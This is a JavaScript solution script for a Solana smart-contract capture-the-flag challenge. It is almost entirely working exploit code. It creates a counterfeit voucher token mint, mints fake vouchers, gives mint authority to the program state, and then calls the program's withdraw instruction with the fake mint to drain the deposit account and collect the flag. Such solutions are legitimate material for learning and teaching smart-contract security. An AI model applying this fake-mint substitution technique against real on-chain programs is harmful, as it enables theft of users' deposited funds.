import * as fs from "fs";
import * as anchor from "@project-serum/anchor";
import { BN } from "bn.js";
import * as splToken from "@solana/spl-token"

import * as api from "./api.js"; 
import { parseAccounts, sendInstructions } from "./util.js";
import { Keypair, PublicKey, SystemInstruction, SystemProgram, Transaction, TransactionInstruction } from "@solana/web3.js";
import { createInitializeAccountInstruction, MintLayout, MINT_SIZE, TOKEN_PROGRAM_ID } from "@solana/spl-token";

const idl = JSON.parse(fs.readFileSync("../idl/challenge1.json"));
const accountFile = parseAccounts(fs.readFileSync("../" + api.PLAYERFILE));
const player = accountFile.player;
const accounts = accountFile.challengeOne;
const program = new anchor.Program(idl, accounts.programId.toString(), "fake truthy value");
const baseUrl = accountFile.endpoint.match(/^(https*:\/\/[^\/]+)\/.*/)[1];
const conn = new anchor.web3.Connection(accountFile.endpoint);

const timer = ms => new Promise( res => setTimeout(res, ms));

// all player code goes here
async function attack() {
    const voucherMint = new Keypair();
    const setupTX = new Transaction();

    // create a new voucher token mint
    const mintRent = await conn.getMinimumBalanceForRentExemption(MINT_SIZE);
    setupTX.add(SystemProgram.createAccount({fromPubkey: player.publicKey, lamports: mintRent, newAccountPubkey: voucherMint.publicKey, programId: TOKEN_PROGRAM_ID, space: MINT_SIZE}))
    setupTX.add(splToken.createInitializeMintInstruction(voucherMint.publicKey, 0, player.publicKey, null));

    // create a voucher token account for our player
    const voucherTokenAccount = await splToken.getAssociatedTokenAddress(voucherMint.publicKey, player.publicKey);
    setupTX.add(splToken.createAssociatedTokenAccountInstruction(player.publicKey, voucherTokenAccount, player.publicKey, voucherMint.publicKey));
    
    // mint totally real voucher tokens to our account
    setupTX.add(splToken.createMintToInstruction(voucherMint.publicKey, voucherTokenAccount, player.publicKey, 10 ** 6));

    // transfer mint to program
    setupTX.add(splToken.createSetAuthorityInstruction(voucherMint.publicKey, player.publicKey, splToken.AuthorityType.MintTokens, accounts.state));

    setupTX.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
    setupTX.feePayer = player.publicKey;
    setupTX.sign(player, voucherMint);
    await conn.sendRawTransaction(setupTX.serialize());

    await timer(5000);

    const winTX = new Transaction();

    // create token account for bitcorns
    const bitcoinTokenAccount = await splToken.getAssociatedTokenAddress(accounts.bitcoinMint, player.publicKey);
    // winTX.add(splToken.createAssociatedTokenAccountInstruction(player.publicKey, bitcoinTokenAccount, player.publicKey, accounts.bitcoinMint));

    // withdraw and win
    winTX.add(await program.instruction.withdraw(new BN(10 ** 6), {
        accounts: {
            player: player.publicKey,
            depositor: player.publicKey,
            state: accounts.state,
            depositAccount: accounts.depositAccount,
            voucherMint: voucherMint.publicKey,
            depositorAccount: bitcoinTokenAccount,
            depositorVoucherAccount: voucherTokenAccount,
            tokenProgram: splToken.TOKEN_PROGRAM_ID
        }
    }));
    winTX.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
    winTX.feePayer = player.publicKey;
    winTX.sign(player);
    await conn.sendRawTransaction(winTX.serialize(), {preflightCommitment: 'processed'});
}

console.log("running attack code...");
await attack();

console.log("checking win...");
const flag = await api.getFlag(baseUrl, player.publicKey, 1);

if(flag) {
    console.log("win! your flag is:", flag);
}
else {
    console.log("no win");
}
